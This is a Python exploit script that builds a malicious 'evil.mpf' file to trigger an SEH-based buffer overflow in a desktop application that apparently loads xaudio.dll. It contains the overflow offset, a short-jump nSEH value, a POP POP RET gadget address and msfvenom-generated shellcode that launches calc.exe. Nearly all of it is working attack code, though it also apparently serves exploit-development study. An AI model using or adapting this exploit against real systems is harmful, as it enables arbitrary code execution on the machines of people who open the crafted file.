from struct import *

malicious_file = "evil.mpf"

# kudos to @fu11shade

# Info
# !mona findmsp
# SEH record (nseh field) at 0x0012f950 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 16 bytes of cyclic data after the handler
# POP POP RET GADGET - !mona seh -n  --->  0x10014E98  addr from xaudio.dll


seh = pack ('<I', 0x10014E98)
nseh = pack ('<I', 0x909032EB) # smol jump


# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d' -f c EXITFUNC=thread ( there are more bchars BUT, whith a few tries we can actually get a working shellcode)

buf = (
"\xdb\xc1\xbd\xb6\x9b\x2f\xce\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x31\x83\xe8\xfc\x31\x68\x14\x03\x68\xa2\x79\xda\x32\x22\xff"
"\x25\xcb\xb2\x60\xaf\x2e\x83\xa0\xcb\x3b\xb3\x10\x9f\x6e\x3f"
"\xda\xcd\x9a\xb4\xae\xd9\xad\x7d\x04\x3c\x83\x7e\x35\x7c\x82"
"\xfc\x44\x51\x64\x3d\x87\xa4\x65\x7a\xfa\x45\x37\xd3\x70\xfb"
"\xa8\x50\xcc\xc0\x43\x2a\xc0\x40\xb7\xfa\xe3\x61\x66\x71\xba"
"\xa1\x88\x56\xb6\xeb\x92\xbb\xf3\xa2\x29\x0f\x8f\x34\xf8\x5e"
"\x70\x9a\xc5\x6f\x83\xe2\x02\x57\x7c\x91\x7a\xa4\x01\xa2\xb8"
"\xd7\xdd\x27\x5b\x7f\x95\x90\x87\x7e\x7a\x46\x43\x8c\x37\x0c"
"\x0b\x90\xc6\xc1\x27\xac\x43\xe4\xe7\x25\x17\xc3\x23\x6e\xc3"
"\x6a\x75\xca\xa2\x93\x65\xb5\x1b\x36\xed\x5b\x4f\x4b\xac\x31"
"\x8e\xd9\xca\x77\x90\xe1\xd4\x27\xf9\xd0\x5f\xa8\x7e\xed\xb5"
"\x8d\x61\x0f\x1c\xfb\x09\x96\xf5\x46\x54\x29\x20\x84\x61\xaa"
"\xc1\x74\x96\xb2\xa3\x71\xd2\x74\x5f\x0b\x4b\x11\x5f\xb8\x6c"
"\x30\x3c\x5f\xff\xd8\xed\xfa\x87\x7b\xf2")

payload = "A" * 4112
payload += nseh
payload += seh
payload += "\x90" * 80
payload += buf



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



try:
    print(bcolors.OKGREEN + "[x]" +  bcolors.ENDC  +  " Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print(bcolors.OKGREEN + "[x]" + bcolors.ENDC + " Creating file")
    payload_execution.write(payload)
    print(bcolors.OKGREEN + "[x]" + bcolors.ENDC + " Adding payload to the malicious file")
    payload_execution.close()
    print(bcolors.OKGREEN + "[x]" + bcolors.ENDC + " Sending junk")
    print(bcolors.OKGREEN + "[x]" + bcolors.ENDC + " Sending POP POP RET via controlled SEH handler")
    print(bcolors.OKGREEN + "[x]" + bcolors.ENDC + " Jumping to shellcode")
except:
    print(bcolors.FAIL + "[!]" + bcolors.ENDC + " Error creating the exploit")



